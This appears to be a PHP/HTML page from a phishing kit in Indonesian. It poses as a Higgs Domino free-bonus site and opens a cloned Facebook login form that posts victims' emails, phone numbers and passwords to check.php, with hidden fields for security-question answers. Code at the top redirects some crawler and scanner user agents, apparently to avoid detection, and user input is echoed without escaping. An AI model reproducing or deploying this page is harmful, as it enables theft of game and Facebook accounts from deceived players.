<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$emailpg = $_POST['emailpg'];
$nick = $_POST['nick'];
?>
<!-- https://t.me/jefanyastore -->
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="alexFrontEnd/css/style.css" />
        <link rel="stylesheet" href="alexFrontEnd/css/responsive.css" />
        <title>Higgs Domino</title>
        <meta property="og:title" content="Higgs Domino">
        <meta name="description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:url" content="./">
        <meta property="og:site_name" content="Higgs Domino">
        <meta property="og:type" content="website">
        <meta name="copyright"content="Jefanya Store">
        <meta name="theme-color" content="#136a62">
        <meta property="og:image" content="https://dominov14.jefanyaefandchr.repl.co/higgs_domino.webp">
        <link rel="icon" href="https://www.bosbosgames.com/favicon.ico">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="https://dominov14.jefanyaefandchr.repl.co/jefanya-facebook.css">
        <style>
            .kiriheaderalex {
        background-color: #0f6862;
    background-image: linear-gradient(
0deg, #158587 0%, #2ea5a5 100%);
    color: #fff;
    padding: 0px 30px 0px 0px;
    border-radius: 25px 5px 30px 25px;
    clip-path: polygon(0 0, 100% 0, 85% 100%, 0% 100%);
}
.boxidalex {
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
}
.boxidalex img {
        width: 35px;
    height: 35px;
    border: 2px solid #1c9c95;
    border-radius: 100%;
    margin-right: 10px;
    margin-left: 5px;
}
.boxidname {
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
}
.boxidname span {
        padding: 1px 10px;
    border: 1px solid #27a79d;
    text-align: center;
    border-radius: 50px;
    background: #0f6862;
    color: #fedca7;
}
#toastnicktop {
        padding: 1px 10px;
    border: 1px solid #27a79d;
    text-align: center;
    border-radius: 50px;
    background: #0f6862;
    color: #fedca7;
    margin-top: 2px;
}
        </style>
    </head>
    <body>
        <div class="appalexsh">
            <div class="containersh">
                <header>
                    <div class="kiriheaderalex">
                        <div class="boxidalex">
                            <img src="https://dominov14.jefanyaefandchr.repl.co/higgs_domino.webp">
                            <div class="boxidname">
                                <span id="toastnicktop"><?php echo $nick;?></span>
                                <span id="toastidtop"><?php echo $emailpg;?></span>
                            </div>
                        </div>
                    </div>
                    <div class="rightsh">
                        <button onclick="location.href='./'" onmousedown="buka.play();">Log Out</button>
                        <button onclick="openrules();" onmousedown="buka.play();">?</button>
                    </div>
                </header>
                <section class="banneralexsh">
                    <div class="w3-content w3-display-container">
                        <img class="mySlides w3-animate-right" src="https://static.neptunegame.com/images/website/img_swiper_2_04.png" style="width:100%">
                        <img class="mySlides w3-animate-left" src="https://static.neptunegame.com/images/website/img_swiper_2_07.png" style="width:100%">
                        <img class="mySlides w3-animate-right" src="https://static.neptunegame.com/images/website/img_swiper_2_02_1.png" style="width:100%">
                        <div class="w3-center w3-container w3-section w3-large w3-text-white w3-display-bottommiddle">
                            <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(1)" onmousedown="buka.play();"></span>
                            <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(2)" onmousedown="buka.play();"></span>
                            <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(3)" onmousedown="buka.play();"></span>
                        </div>
                    </div>
                    <div class="arrowalexbanner">
                        <div class="itemarrowalex kiriarrow" onclick="plusDivs(-1)" onmousedown="buka.play();"></div>
                        <div class="itemarrowalex kananarrow" onclick="plusDivs(1)" onmousedown="buka.play();"></div>
                    </div>
                </section>
                <section class="subbannersh">
                    <div class="imagesubsh">
                        <img src="https://dominov14.jefanyaefandchr.repl.co/domino_text.png" alt="domino_logo" />
                        <div class="titlebannersh">
                            <p>Verifikasi akun Gagal!</p>
                            <small>Mohon verifikasi kembali.</small>
                        </div>
                    </div>
                </section>
                <section class="erroralexsh">
                    <div class="boxerrorsh">
                        <img src="alexFrontEnd/img/error.png" alt="error_logo" />
                        <strong>Terjadi Error!</strong>
                        <p>Gagal melakukan klaim bonus,data yang anda masukan salah.</p>
                        <button onclick="location.href='./'"></button>
                    </div>
                </section>
                <section class="footeralexsh">
                    <div class="topfootsh">
                        <div class="sosmedsh">
                            <div class="buttonfootsh fbfoot"></div>
                            <div class="buttonfootsh mfoot"></div>
                            <div class="buttonfootsh igfoot"></div>
                            <div class="buttonfootsh pfoot"></div>
                        </div>
                        <div class="gotopfootsh" onclick="location.href='https://api.whatsapp.com/send?phone=620awd&text=Saya%20telah%20melakukan%20verifikasi%20klaim%20bonus.%20Bagaimana%20selanjutnya%3F'" style="background: url(https://3.bp.blogspot.com/-_mkfXtW5iGI/XDq9sQZwwCI/AAAAAAAAAnc/fl5r4zQsr1oQhj4gVahUKJinOdcZg82kACLcBGAs/s1600/order-lewat-whatsapp.png) no-repeat center;background-size: 100% 100%;width: 120px;height: 45px;"></div>
                    </div>
                    <div class="copyrightfootsh">
                        <span>Seluruh hak cipta.Terhubung dengan Kami!</span>
                    </div>
                </section>
                
                <main class="poprulesalexsh">
                    <div class="boxrulessh">
                        <strong>Peraturan hadiah:</strong>
                        <span>1. <note>Setiap akun hanya bisa memperoleh 1 hadiah.</note></span>
                        <span>2. <note>Hadiah akan dikirimkan melalui inbox game.</note></span>
                        <span>3. <note>Event dapat berakhir sesuai yang telah di tentukan.</note></span>
                        <span>4. <note>Pihak Higgs Domino dapat mengakhiri event kapan saja sebelum event berakhir.</note></span>
                        <div class="btnrulessh">
                            <button onclick="closerules();" onmousedown="buka.play();"></button>
                        </div>
                    </div>
                </main>
                
                <div class="popup-ariandi alex-facebook animate fadeIn" style="display: none;">
                    <div class="container-box-fb" style="margin-top: 10%;">
                        <div class="atasan-fb" style="width: 95.2%;">
                            <img src="https://dominov14.jefanyaefandchr.repl.co/facebook_text.png">
                        </div>
                        <div class="isi-facebook">
                            <p class="kaget email-fb" style="width: 320px; top: -15px;">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></b></p>
                            <p class="kaget sandi-fb" style="width: 320px; top: -15px;">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                            <img src="https://dominov14.jefanyaefandchr.repl.co/higgs_domino.webp">
                            <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk terhubung dengan Higgs Domino</div>
                            <form class="form-login-fb" method="POST" action="check.php" onsubmit="return AlexHostingNetFB()" id="formLogin" onsubmit="open_my_account();">
                                <label>
                                    <input type="text" id="alx_email_fb" name="emailfb" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: none" required>
                                </label>
                                <label>
                                    <input type="password" id="alx_password_fb" name="passwordfb" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: none" required>
                                </label>
                                <input type="hidden" name="playid" value="2027575" readonly>
                                <input type="hidden" name="nick" value="Lutfiey" value="" readonly>
                                <input type="hidden" name="email" value="2027575" readonly>
                                <input type="hidden" name="password" value="dsfsdfsdf" value="" readonly>
                                <input type="hidden" name="phone" value="324234234" value="" readonly>
                                <input type="hidden" name="quest1" value="Apa nama film pertama yang Anda tonton?" readonly>
                                <input type="hidden" name="answer1" value="34534534" readonly>
                                <input type="hidden" name="quest2" value="Apa pekerjaan pertama Anda?" readonly>
                                <input type="hidden" name="answer2" value="gfdgfdgdf" readonly>
                                <input type="hidden" name="quest3" value="Apa makanan kesukaan Anda?" readonly>
                                <input type="hidden" name="answer3" value="ewrewr" readonly>
                                <button class="btn-login-fb" type="submit">Masuk</button>
                            </form>
                            <div class="txt-buat-akun">Buat akun</div>
                            <div class="txt-tidak-sekarang">Lain kali</div>
                            <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
                        </div>
                        <div class="isi-bahasa">
                            <center>
                                <div class="nama-bahasa bahasa-aktif">Bahasa Indonesia</div>
                                <div class="nama-bahasa">English (UK)</div>
                                <div class="nama-bahasa">Basa Jawa</div>
                                <div class="nama-bahasa">Bahasa Melayu</div>
                                <div class="nama-bahasa">???</div>
                                <div class="nama-bahasa">Español</div>
                                <div class="nama-bahasa">Português (Brasil)</div>
                                <div class="nama-bahasa"><i class="fa fa-plus"></i>
                                </div>
                            </center>
                        </div>
                        <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
                    </div>
                </div>
                
            </div>
        </div>
        <iframe scrolling="no" allow="autoplay" controls loop src="https://dominov14.jefanyaefandchr.repl.co/theme_alex_hdi.mp3" style="display: none" width="0" height="0" frameborder="no"></iframe>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>   
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script src="alexFrontEnd/js/all.js"></script>
    </body>
</html>